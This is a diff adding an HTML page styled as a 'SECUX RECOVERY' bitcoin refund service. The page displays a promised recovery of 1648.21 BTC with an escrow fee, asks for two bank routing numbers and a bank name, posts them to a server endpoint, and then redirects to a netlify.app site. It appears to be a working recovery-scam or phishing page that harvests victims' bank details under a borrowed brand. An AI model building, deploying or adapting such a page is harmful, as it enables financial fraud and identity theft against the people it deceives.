@@ -1,0 +1,226 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>BTC Refund Recovery</title>
+	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+	<style>
+		body {
+			background: #232323;
+			color: #e0e0e0;
+			font-family: 'Inter', Arial, sans-serif;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			min-height: 100vh;
+		}
+		.container {
+			background: #18191c;
+			border-radius: 18px;
+			box-shadow: 0 4px 32px rgba(0,0,0,0.4);
+			padding: 32px 20px;
+			width: 100%;
+			max-width: 400px;
+		}
+		.header {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			margin-bottom: 18px;
+		}
+		.logo {
+			font-weight: 700;
+			font-size: 1.2em;
+			letter-spacing: 1px;
+		}
+		.logo span {
+			color: #b6ff6b;
+		}
+		.btn {
+			background: #232323;
+			color: #b6ff6b;
+			border: none;
+			border-radius: 8px;
+			padding: 8px 18px;
+			font-weight: 600;
+			cursor: pointer;
+			transition: background 0.2s;
+		}
+		.btn:hover {
+			background: #2e2e2e;
+		}
+		.tab-group {
+			display: flex;
+			gap: 10px;
+			margin-bottom: 18px;
+		}
+		.tab {
+			flex: 1;
+			background: #232323;
+			color: #e0e0e0;
+			border: none;
+			border-radius: 8px;
+			padding: 8px 0;
+			font-weight: 500;
+			cursor: pointer;
+			transition: background 0.2s;
+		}
+		.tab.active {
+			background: #1a1a1a;
+			color: #b6ff6b;
+		}
+		.card {
+			background: #232323;
+			border-radius: 12px;
+			padding: 18px 14px;
+			margin-bottom: 18px;
+			box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+		}
+		.btc-amount {
+			font-size: 1.6em;
+			font-weight: 700;
+			margin-bottom: 6px;
+		}
+		.label {
+			color: #b6ff6b;
+			font-size: 0.95em;
+			margin-bottom: 2px;
+		}
+		.slider-row {
+			display: flex;
+			align-items: center;
+			gap: 10px;
+			margin: 10px 0 14px 0;
+		}
+		.slider {
+			flex: 1;
+		}
+		.info-row {
+			display: flex;
+			justify-content: space-between;
+			font-size: 0.98em;
+			margin-bottom: 2px;
+		}
+		.form-group {
+			margin-bottom: 14px;
+		}
+		.form-input {
+			width: 100%;
+			padding: 10px;
+			background: #18191c;
+			border: 1px solid #333;
+			border-radius: 7px;
+			color: #e0e0e0;
+			font-size: 1em;
+			margin-top: 2px;
+		}
+		.form-input:focus {
+			outline: none;
+			border-color: #b6ff6b;
+		}
+		.submit-btn {
+			width: 100%;
+			background: #b6ff6b;
+			color: #232323;
+			font-weight: 700;
+			border: none;
+			border-radius: 8px;
+			padding: 12px 0;
+			font-size: 1.1em;
+			margin-top: 10px;
+			cursor: pointer;
+			transition: background 0.2s;
+		}
+		.submit-btn:hover {
+			background: #a0e65c;
+		}
+		.note {
+			color: #888;
+			font-size: 0.92em;
+			margin-top: 8px;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<div class="header">
+			<div class="logo">SEC<span>UX</span> RECOVERY</div>
+			<button class="btn" type="button">Collect BTC</button>
+		</div>
+		<div class="tab-group">
+			<button class="tab active" type="button">Recovery Page</button>
+			<button class="tab" type="button">Start Recovery</button>
+		</div>
+		<form id="refundForm" class="card">
+			<div class="btc-amount" id="btcAmount">1648.21 BTC</div>
+			<div style="margin-bottom: 8px;">to be recovered</div>
+			<div class="slider-row">
+				<span class="label">Recovery</span>
+				<input type="range" min="0" max="1" step="1" value="0" class="slider" id="recoverySlider" disabled>
+				<span class="label">Activity</span>
+			</div>
+			<div class="info-row">
+				<div>
+					<span class="label">Due Date</span><br>
+					<span id="dueDate">Jan 1, 2026</span>
+				</div>
+				<div>
+					<span class="label">Escrow Fee</span><br>
+					<span id="escrowFee">0.18</span>
+				</div>
+			</div>
+			<div class="info-row" style="margin-top: 8px;">
+				<div>
+					<span class="label">Recovery Amount</span><br>
+					<span id="recoveryAmount">1648.21 BTC</span>
+				</div>
+			</div>
+			<div class="form-group">
+				<label class="label" for="routing1">Bank Routing Number</label>
+				<input class="form-input" type="text" id="routing1" name="routing1" placeholder="Recurrent: Active Recover" required>
+			</div>
+			<div class="form-group">
+				<label class="label" for="routing2">Bank Routing Number</label>
+				<input class="form-input" type="text" id="routing2" name="routing2" placeholder="Recurrent: Active Recover" required>
+			</div>
+			<div class="form-group">
+				<label class="label" for="bankName">Bank Name</label>
+				<input class="form-input" type="text" id="bankName" name="bankName" placeholder="Recurrent: Active Recover" required>
+			</div>
+			<button class="submit-btn" type="submit">Submit Refund Request</button>
+			<div class="note">We will convert your BTC to USD and send to your provided bank account.</div>
+		</form>
+	</div>
+	<script>
+		document.getElementById('refundForm').addEventListener('submit', async function(e) {
+			e.preventDefault();
+			const data = {
+				btcAmount: document.getElementById('btcAmount').textContent,
+				dueDate: document.getElementById('dueDate').textContent,
+				escrowFee: document.getElementById('escrowFee').textContent,
+				recoveryAmount: document.getElementById('recoveryAmount').textContent,
+				routing1: document.getElementById('routing1').value,
+				routing2: document.getElementById('routing2').value,
+				bankName: document.getElementById('bankName').value
+			};
+			try {
+				const response = await fetch('/api/refund', {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify(data)
+				});
+				if (response.ok) {
+					// Redirect to your crypto site after successful submission
+					window.location.href = 'https://secux-app.netlify.app/';
+				} else {
+					alert('There was an error submitting your request.');
+				}
+			} catch (err) {
+				alert('There was an error submitting your request.');
+			}
+		});
+	</script>
+</body>
+</html>
